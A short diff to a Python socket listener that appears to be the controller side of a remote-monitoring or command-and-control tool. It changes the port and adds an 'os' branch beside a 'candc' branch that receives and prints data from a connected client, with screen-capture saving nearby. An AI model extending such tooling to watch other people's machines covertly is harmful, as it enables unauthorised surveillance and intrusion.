@@ -6,7 +6,7 @@ import time
 command = str()
 
 mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)
-mon_socket.bind(("",1242))
+mon_socket.bind(("",1243))
 mon_socket.listen(5)
 conf,info = mon_socket.accept()
 
@@ -20,7 +20,12 @@ while command != "exit":
         f.write(message)
         f.close()
         #image.save("monitor-screen.png")
-    if command == "candc":
+
+    elif command == "os":
+        message= conf.recv(262144)
+        message=message.decode("UTF-8")
+        print(message)
+    elif command == "candc":
         message= conf.recv(262144)
         message=message.decode("UTF-8")
         print(message)
